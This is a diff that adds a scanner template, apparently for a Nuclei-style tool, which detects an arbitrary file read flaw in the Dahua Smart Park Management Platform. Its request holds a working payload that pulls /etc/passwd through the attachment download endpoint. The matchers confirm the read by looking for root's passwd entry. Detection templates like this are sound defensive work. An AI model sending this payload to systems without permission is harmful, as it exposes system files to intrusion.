@@ -1,0 +1,25 @@
+id: dahua-wpms-lfi
+name: Dahua Smart Park Management Platform - Arbitary File Read
+severity: high
+confidence: confirmed
+description: Dahua Smart Park Management Platform is vulnerable to Local File Inclusion.
+reference: https://mp.weixin.qq.com/s/uRhVl2XC5fTNKO8eDFFebA
+tags:
+- lfi
+- dahua
+- wpms
+- vuln
+requests:
+- method: GET
+  path: /portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/etc/passwd
+  matchers:
+  - type: header
+    words:
+    - filename=passwd
+  - type: regex
+    regex:
+    - 'root:.*:0:0:'
+  - type: status
+    status:
+    - 200
+  condition: and
